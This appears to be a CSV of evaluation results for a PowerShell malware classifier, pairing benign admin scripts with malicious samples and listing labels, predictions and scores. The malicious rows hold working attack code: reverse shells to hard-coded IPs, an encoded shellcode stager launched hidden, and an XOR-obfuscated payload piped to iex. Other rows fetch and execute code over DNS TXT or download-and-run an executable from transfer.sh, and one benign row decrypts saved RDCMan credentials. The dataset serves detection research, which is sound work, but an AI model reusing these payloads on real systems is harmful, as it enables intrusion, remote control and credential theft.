filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,pair_strategy,correct,predicted_label,logit_diff
2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
    
Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
)

function Get-DecompressedByteArray {

	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
        [byte[]] $byteArray)

	Process {
	    Write-Verbose ""Get-DecompressedByteArray""
        $input = New-Object System.IO.MemoryStream( , $byteArray )
	    $output = New-Object System.IO.MemoryStream
        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
	    $gzipStream.CopyTo( $output )
        $gzipStream.Close()
		$input.Close()
		[byte[]] $byteOutArray = $output.ToArray()
        Write-Output $byteOutArray
    }
}


function Write-StreamToDisk {
    
    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))

}

Write-StreamToDisk -memstream $memstream -outputloc $outputloc",250,benign,FromBase64String,rotate_same_family_benign_one_pair_per_malicious,True,benign,-0.890625
fa2y/malicious_samples/93b9220639021cb8755213b2369503667fecca7b1e311d5a97483b4f017c60f4.ps1,malicious,fa2y:malicious_samples,FromBase64String,FromBase64String,1,True,2373,2373,False,"if([IntPtr]::Size -eq 4){
    $b='powershell.exe'
}else{
    $b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'
};
$s=New-Object System.Diagnostics.ProcessStartInfo;
$s.FileName=$b;
$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAD4/yFwCA7VW+2+bSBD+OZHyP6DKEqA4xsRO00aqdIufOCaxg+34UavawAIbL2DD4lev//sNNrTpNb1rTzqUx7I7MzvzzTczOElgcRoGgqe1korw+ez0pIcj7AtSIdFZUSi4vnxyAruF+PJq/1b4IEgztFzWQx/TYH5zU0uiiAT8+F5qEY7imPhPjJJYkoU/hUePROTi/umZWFz4LBQ+lVosfMIsE9vVsOUR4QIFdnrWDS2celMyl4xySfz4UZRnF+q81FglmMWSaO5iTvySzZgoC1/k9MLBbkkk0aBWFMahw0uPNKhcloZBjB1yB9bWxCDcC+1YlCEM+IkIT6JAOAaUWjieSyIse1FoIduOSByLRWGW2p7N539Is+zihyTg1CclPeAkCpcmidbUInGpjQObkQfizEHL5BEN3Lksg9g6XBCpECQMsPwdM9Id2eSw/aqS9FIJpHo8kouQyNcCNUI7YeSoKr7iaZp9GZ4jAwC5L2enZ6dOzhZa/lR7SRZYncwOawLOSb0wpge5D0K5KBhwC+ZhtIPXwiBKiDz/Cq1Q2Meb4s/V1VwWJN11DXZmo5Dac9DI0lmg0366/XNW1olDA1LfBdinVk486TWEicPIIcBSLnYHLklidkDsOmHExTyFLE30D2oNn/KvulpCmU0iZEGWYvAKEih/78wxC5KoBwbxAaDjOzCv4ADdSS6dUXyX356+g5BYYziOi0IvgXqzioJJMCN2UUBBTLMjlPDwsBS/uWskjFMLxzw3N5czGLPramEQ8yixIGUQ+sBcEotiliJRFNrUJtrOpG5+rfgqDjXMGNQAWFpDHmAnjd/kKREi8DBNulwyCdf9JSM+iBzKvsmwC0WeEf1AHOwSW/ybfzmNj5xNgcgReOEdZNdkIS8KIxpxaB4pqECg/3T3i6aRelGLSJYEKS+MmbbjKZ0LweV1I2VjBskBgIhD8M0o9DUck7fVY3uQ3ij3tIbgmegBMyxtQVW0oapuwO+QVvSwfm3fdp7bSlTfeg7SY91o9+r9dru67pijKjcbOr/t6dxojJ+fTdR+GE74VEftAS0vJtX9skP3ZhfZk63ydq/tN2Vtu392bWdSdxz32jEf1Ksm7T7W+lr5EnfrjaT7qG20cjVu0E27T4f9RafJnyYjhoeO4o7V95huu9HzSA2NvY5Qy6tY+44zanmGvZu0KXlWyl3aR32Ebq2H4bDlLt1WjJT3o1XNd28R0g2MdNQY7TpXTOsPmxoaNrQ+vg97lfO6ok7tVaM5HeOOz+xWW1EnY2SjSBm4nnp97wUpTtjVVloqg7rTXVMBmV4VtauXdD9d9VsuaoDMyA8RbtLF8HwMNu8GoPM4VO0Q8UAfK8rIVVzkmN4EIw2ktRVqamFt965n9JTR6NJTnxaqBz6T8fqd0UHnTaunKMq5/wR/FWQZy20w1jbXa7dthrf4Fo/W04qiDjYtB63Q+bmmak+83ah01nDvQHk//PAmpQ/wp4B71cULXvyslxs4ij3MgC/Qo/P6bIZRM2u8vZCmGpJ0HNcLEgWEwbiDgZgTHTEWWmnfP/RomDnHSZAOpiEsK5evrmThq6D8bRzkWzc3U3ATaield6lLApd7xfK2Ui5Dey9vq2UI89dDq4XLnXQwVUzHwwGb3DY72JbTmipsVON/hiyrZA/+2f8G2be9fzj9JRjLxWPIP2x/v/FbmP5+7I+YchA1oRcxcpyDr0OQEeTFRwIkBrLvZE/6mXef8Is7+HQ4O/0LsvVUpFEKAAA=''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
$s.UseShellExecute=$false;
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);",250,malicious,FromBase64String,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.046875
4207.ps1,benign,natural_overlap,FromBase64String,FromBase64String,2,True,1883,1883,False,"﻿function Decrypt-RDCMan ($FilePath) {

    if (!$FilePath) {
        [xml]$config = Get-Content ""$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings""
        $Xml = Select-Xml -Xml $config -XPath ""//FilesToOpen/*""
        $Xml | select-object -ExpandProperty ""Node""| % {Write-Output ""Decrypting file: "" $_.InnerText; Decrypt-RDCMan $_.InnerText}
    } else {
    [xml]$Types = Get-Content $FilePath

    $Xml = Select-Xml -Xml $Types -XPath ""//logonCredentials""

    
    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + ""\"" + $_.Username + "" - "" + $Pass + "" - "" + ""Hash:"" + $_.Password + ""`n"" } 

    
    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password.""
    }
}

function Decrypt-DPAPI ($EncryptedString) {
    
    Add-Type -assembly System.Security
    $encoding= [System.Text.Encoding]::ASCII
    $uencoding = [System.Text.Encoding]::UNICODE

    
    try {
    	$encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
        $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
        echo $myStr1
    } 
    catch {
        
        try {
            $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
            $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
            [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
            echo $myStr1
        }
	    catch {
            echo ""Could not decrypt password""
        }
    }
}",251,benign,FromBase64String,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.328125
fa2y/malicious_samples/52164309bdf96b5089a7087b59a107d724f8fcc59c3280b7d5223a8d4092d3d9.ps1,malicious,fa2y:malicious_samples,FromBase64String,IEX|FromBase64String,2,True,2532,2532,False,"$jq2y13vf7k96n4c = [System.Text.Encoding]::ASCII.GetBytes(""g83wljmukoic"")

function u1lpi5kb86ma7t2synxwj9q3ezh {
    param($js0hfx1m8vl4qgy)
    $6yorbd8xcihuw9q = [System.Convert]::FromBase64String($js0hfx1m8vl4qgy)
    $lvu105oy2g46is9 = $jq2y13vf7k96n4c

    $w5lg3krfdvmz867 = $(for ($ry0qt2wahxfzl5c = 0; $ry0qt2wahxfzl5c -lt $6yorbd8xcihuw9q.length;) {
        for ($4mo6ja37v9xc5er = 0; $4mo6ja37v9xc5er -lt $lvu105oy2g46is9.length; $4mo6ja37v9xc5er++) {
            $6yorbd8xcihuw9q[$ry0qt2wahxfzl5c] -bxor $lvu105oy2g46is9[$4mo6ja37v9xc5er]
            $ry0qt2wahxfzl5c++

            if ($ry0qt2wahxfzl5c -ge $6yorbd8xcihuw9q.Length) {
                $4mo6ja37v9xc5er = $lvu105oy2g46is9.length
            }
        }
    })

    $hd26lnj4a5s1x89 = New-Object System.IO.MemoryStream(,$w5lg3krfdvmz867)
    $0nd7v621wf4a93u = New-Object System.IO.MemoryStream
    $miavdhspc4fjk01 = New-Object System.IO.Compression.GzipStream($hd26lnj4a5s1x89, [IO.Compression.CompressionMode]::Decompress)
    $miavdhspc4fjk01.CopyTo($0nd7v621wf4a93u)
    $miavdhspc4fjk01.Close()
    $hd26lnj4a5s1x89.Close()

    [byte[]] $h2ijmzq91kwlupc = $0nd7v621wf4a93u.ToArray()
    $rh2smyuve3co58a = $h2ijmzq91kwlupc

    return $rh2smyuve3co58a
}

[byte[]] $7pgiyfkw0l6q5nx = u1lpi5kb86ma7t2synxwj9q3ezh(""eLM7d2xqbXVvb+Q2vEqQT3wXM9+TaPzpytjGN/2yHBv+aFIgdff17jA2VsaAJiSqR3gCwGQLTSyUlF3Uo4nUVjxvxaBREpMXLPChe9v56+MLPuFx/AFA4bZDL1rZ64npbh+y3WDg5bqGrLUBOaIuShEoJzXueLD+vXN6//cQQzTMBx88Q7o1jfiML0IoRNs6jwYvaP+uDznUzws3b6Kbrwvcjg+Y/4stLpl3FmI4dinPvk7nPkpbYLJ4Gm9ZOsFuTSc6DkNSNaG9gEVp8Kw4h1SNPEVJZnSXfK9+gyL5jd+Ox9mjWdQOkOJRMmWE7xZfhBXbYfzNwzKRb83LKfxydTJyIhdETDeNW8PIYaBySh2gxZAB7LXdpLx/s3yBz1yqDexNZ2F0JJoLFv04nKwE3/e8Z8DCiUK5wW+EjGKVGs+nWZBdR1WtdP18EcNildli34mNrBFVMkCg+U9Nuu7X3aYI5gR+CzL36tzs2DXXYO6kOrzeyN6GHRLeRq5OIlbPWAEmXmM1LBACSta8yNsDZqidCJzO8THcDCBqJVRjAJI/KrMAo3qX3Sq0XgF28S5+s30ZRZ6UA0y1cN+AJg0N952VZf0BGOlzYnAI/L46zahWa59ctvP/hWQVPQvFVcExJklRVVAe52BxQeYqe+N353MfEVkgrqsFN8f5nuOgsodyYiwrZUKJ5BU7TwPRVFOujrYfBnYuJt9aP3k2F2tABZ+JQkglGcLGWSsj0K4ATgHakaUBO3ZUa3oASFc5YQv0cvYRRJCrvgvzWITDKJt1CMwUYkypzknja+pdvXAadHVIgnaBwEw4dAUHUCTS2CLOTP0ezCVl0/wGBLpBwXAQPi7p1CpLsx2nnxMvNi2mBOcrfpwQgeuX7a1N30Gw95TsojYLN4/y1JWvfbqLVNvnZX1Fue+NSL1L5gMz97rPxmhBDEAQBJRGmIH/NxabFsJgyQO1zbyqAkpok4wPe3ZFeg8YBgvVd5ysqL9QlEbZQ1u2ENb8uqLluo8IXwHmRJqNsSDsUrNFsJkEnLjfUX/1E/QzkJ66l2vc+t+BYytziPwsEnbmU+v1N4fsKkT3pSw4ZrR4aZwot0BbLLGvBP6y3ylFzMXEqqiGsk7xLUqPSD6IH3BOz84eF/+Mqifh9GOpTGgusVJ+ZQgIDgaMQEiDN5tMj2zMKyli4OR+dOzXD6Uk0GI2CIBZBN4QKuu/yTZp0ICcKGtqbQ=="")) | iex",251,malicious,FromBase64String,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.25
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",271,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/malicious_samples/f55369c6d50c5a57c0a54c0d1a1560c0601e17f08d64f94a0fea9eed9768beae.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,27,27,False,irm massgrave.dev/get | iex,271,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.78125
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",272,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/93a790e0a65d0a47a7988e81f069c4c7044802c50848735dcaf0f6b0ef921dcd.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,35,35,False,irm https://massgrave.dev/get | iex,272,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.984375
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",276,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
2752.ps1,malicious,natural_overlap,IEX,IEX,1,True,82,82,False,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]},276,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.703125
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",277,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/26493876411716e344173fdfd39aa4e85e740361f53b92ef17eba897890c50e4.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,82,82,False,if(''+(nslookup -q=txt p.s.rk.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]},277,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,0.5625
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",281,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/malicious_samples/417a0be8ef6073897f81fa6912d3a203a9aea432e16af30fe32376671cfa0d44.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,167,167,False,"curl -o ""$HOME\desktop\arch.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""

powershell.exe -ExecutionPolicy bypass -windowstyle hidden iex ""$HOME\desktop\arch.exe""",281,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,3.0625
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",282,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/94601fc7759612cc1ce13844d6c26cd3ac2e547a1c96e87ae4e2b87a1c2c57e1.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,212,212,False,"powershell -ExecutionPolicy Bypass -windowstyle hidden curl -o ""$HOME\desktop\a.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""

powershell -ExecutionPolicy Bypass -windowstyle hidden iex ""$HOME\desktop\a.exe""",282,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,4.515625
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",286,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/bazaar_out/60432d413022568476a12ceb8f9c03b5db0feecb794241a2eccf3b2f7cc4ea72.ps1,malicious,fa2y:bazaar_out,IEX,IEX,1,True,504,504,False,"﻿$client = New-Object System.Net.Sockets.TCPClient(""161.35.124.119"",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ""PS "" + (pwd).Path + ""> "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",286,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,8.0703125
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",287,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
fa2y/malicious_samples/927dbf8e34afe2ca1e73bb4bf1f2072149c0426654a225620711f3a22b1427e6.ps1,malicious,fa2y:malicious_samples,IEX,IEX,1,True,542,542,False,"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(""10.0.0.1"",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ""PS "" + (pwd).Path + ""> "";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",287,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,7.34375
1637.ps1,benign,natural_overlap,IEX,IEX,1,True,886,886,False,"function Get-BootConfigurationData {
    param (
        $bcdeditpath = (Join-Path $env:SystemRoot 'system32\bcdedit.exe')
    )

    $bootconfigurationdata = iex $bcdeditpath
    $bootconfigurationdata += ''

    $hash = $null
    $result = foreach ($line in $bootconfigurationdata) {
        if ($line -eq '') {
            if ($hash) {
                [pscustomobject]$hash
            }
            $hash = @{}
            continue
        }
        if ($line.startswith('-----')) { continue }
        if ($line.startswith('Windows Boot')) {
            $hash.Add('Type', $line)
        } else {
            $name = $line.Substring(0, $line.IndexOf(' '))
            $value = $line.Substring($line.IndexOf(' ')).trim()
            $hash.Add($name, $value)
        }
    }

    $props = $result | % {gm -in $_ -ty *property} | % name | select -u | sort

    $result | select $props
}",291,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-2.171875
fa2y/malicious_samples/2d336ee677f040b0c8138cf4a69b78d4e3ae1f99dbd83327f013df6a1d28fe8a.ps1,malicious,fa2y:malicious_samples,IEX,IEX,4,True,824,824,False,"$flol3=iex($('[Environment]::GetEdrzt'''.Replace('drz','nvironmentVariable(''public'') + ''\\ih7nyv.ba')));$flol=iex($('[Environment]::GetEdrzt'''.Replace('drz','nvironmentVariable(''public'') + ''\\u5p3.ba')));function getit([string]$fz, [string]$oulv){$ff=iex($('(Npha5w-Objpha5ct Systpha5m.Npha5t.Wpha5bClipha5nt).Downsemte($oulv.Replace(''xml4'',''tps://'').Replace(''dgu'', ''e''), $fz)').Replace('pha5', 'e').Replace('semt', 'loadFil'));iex('sbxec8arbxec8 $fz'.Replace('bxec8','t'))};getit -fz $flol -oulv 'htxml4www.dld.adgu/zp/zpdguu.dguxdgu';$fzf=$(Get-Location).tostring() + '\\';Remove-Item -Path ($fzf + $(Get-ChildItem -Include *.lnk -Name));getit -fz ($fzf + 'List of required items and services.pdf') -oulv 'http://www.bludgumaxxlasdgur.com/rh/List%20of%20rdguquirdgud%20itdgums%20and%20sdgurvicdgus.pdf';exit",291,malicious,IEX,rotate_same_family_benign_one_pair_per_malicious,True,malicious,6.265625
1634.ps1,benign,natural_overlap,IEX,IEX,1,True,1434,1434,False,"function Get-ComputerShares {
    param (
        [string]$comp = $env:COMPUTERNAME
    )
    
    if (!$comp) { throw 'No comps.' }

    $ping = New-Object System.Net.NetworkInformation.Ping
    try {
        $result = $ping.Send($comp)
    } catch {
        $result = $null
    }

    $sharename = $type = $comment = $ip = '-'
    if ($result.Status -eq 'Success') {
        
        $ip = $result.Address.ToString()

        
        $netview = iex ""cmd /c net view $comp 2>&1"" | ? {$_}

        
        if ($netview.count -lt 5) {
            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
            return
        }

        $netview = $netview | ? {$_  -match '\s{2}'} | select -Skip 1

        foreach ($line in $netview) {
            $line = $line -split '\s{2,}'

            $sharename = $line[0]
            $type = $line[1]
            $comment = $line[2]

            [pscustomobject]@{
                Computer = $comp
                IP = $ip
                ShareName = $sharename
                Type = $type
                Comment = $comment
            }
        }
    } else {
        [pscustomobject]@{
            Computer = $comp
            IP = $ip
            ShareName = $sharename
            Type = $type
            Comment = $comment
        }
    }
}",292,benign,IEX,rotate_same_family_benign_one_pair_per_malicious,True,benign,-3.34375
